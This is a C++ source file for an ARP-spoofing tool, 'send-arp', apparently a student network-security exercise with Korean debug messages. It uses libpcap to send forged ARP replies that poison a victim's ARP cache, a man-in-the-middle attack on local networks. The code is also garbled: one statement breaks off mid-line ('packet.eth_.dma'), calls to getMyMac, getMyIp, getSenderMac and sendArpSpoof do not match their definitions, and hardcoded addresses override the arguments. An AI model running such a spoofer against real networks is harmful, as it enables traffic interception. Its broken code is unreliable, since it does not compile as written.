#include <cstdio>
#include <pcap.h>
#include <libnet.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <net/if.h>
#include "ethhdr.h"
#include "arphdr.h"
#define MAC_SIZE 6


#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}



int getMyIp(const char* dev, EthArpPacket &packet) {
    int sockfd;
    struct ifreq ifr;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        printf("Fail to get interface IP address - socket() failed - %m\n");
        return -1;
    }

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        printf("Fail to get interface IP address - ioctl(SIOCSIFADDR) failed - %m\n");
        close(sockfd);
        return -1;
    }

    close(sockfd);

    packet.arp_.sip_ = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;

    return 0;
}
int getMyMac(const char* dev, EthArpPacket &packet) {
    struct ifreq ifr;
    int sockfd, ret;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        printf("Fail to get interface MAC address - socket() failed - %m\n");
        return -1;
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if (ret < 0) {
        printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sockfd);
        return -1;
    }

    close(sockfd);
    memcpy(packet.eth_.smac_, ifr.ifr_hwaddr.sa_data, Mac::SIZE);

    return 0;
}

bool getSenderMac(pcap_t* handle, EthArpPacket &packet) {
    packet.eth_.dma
    packet.arp_.tip_ = htonl(Ip("172.20.10.2"));

    printf("요청 드갑니다잉~\n");
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* responsePacket;
        int res2 = pcap_next_ex(handle, &header, &responsePacket);
        printf("드가자~\n");
        if (res2 == 0) continue;
        if (res2 == -1 || res2 == -2) {
            printf("pcap_next_ex return %d(%s)\n", res2, pcap_geterr(handle));
            return false;
        }
        printf("pcap 잡았당!\n");
        EthArpPacket* recvPacket = (EthArpPacket*)responsePacket;
        if (ntohs(recvPacket->eth_.type_) != EthHdr::Arp) {
            continue;
        }
        if(ntohs(recvPacket->arp_.op_) != ArpHdr::Reply) {
            continue;
        }
        if(recvPacket->arp_.sip_ != htonl(Ip("172.20.10.2"))) {
            printf("응 sender 아니야~\n");
            continue;
        }
        printf("오 sender에서 보냄!\n");

        memcpy(packet.arp_.tmac_, recvPacket->arp_.smac_, Mac::SIZE); // senderMac update
        return true;
    }
}

bool sendArpSpoof(pcap_t* handle, EthArpPacket &packet) {
    packet.arp_.sip_ = htonl(Ip("172.20.10.2"));
    packet.arp_.tip_ = htonl(Ip("172.20.10.5"));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return false;
    }
    return true;
}

int main(int argc, char* argv[]) {
	printf("hihihihi\n%d\n",argc);
	if (argc != 4) {
		usage();
		return -1;
	}
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket myPacket;
    if(getMyMac(dev, myPacket.eth_.smac_) == -1) {
        return -1;
    }
	printf("getmymac done! \n");

    if(getMyIp(dev, &(myPacket.arp_.sip_)) == -1) {
        return -1;
    }
	printf("getmyip done!\n");

    for (int i = 2; i < argc; i += 2) {
        myPacket.arp_.tip_ = htonl(Ip(argv[i])); // senderIp
        uint32_t targetIp = htonl(Ip(argv[i + 1])); // Not used in EthArpPacket, keep as is

        if (!getSenderMac(handle, myPacket.eth_.smac_, myPacket.arp_.sip_, myPacket.arp_.tip_, myPacket.arp_.tmac_)) {
            printf("Failed to get sender MAC address.\n");
            return -1;
        }
		printf("getsendermac done!\n");
        if (!sendArpSpoof(handle, myPacket.eth_.smac_, myPacket.arp_.sip_, myPacket.arp_.tip_, myPacket.arp_.tmac_)) {
            printf("Failed to send ARP spoofing packet.\n");
            return -1;
        }
        printf("Spoofed ARP of target %s.\n", argv[i + 1]);
    }

    pcap_close(handle);
    return 0;
}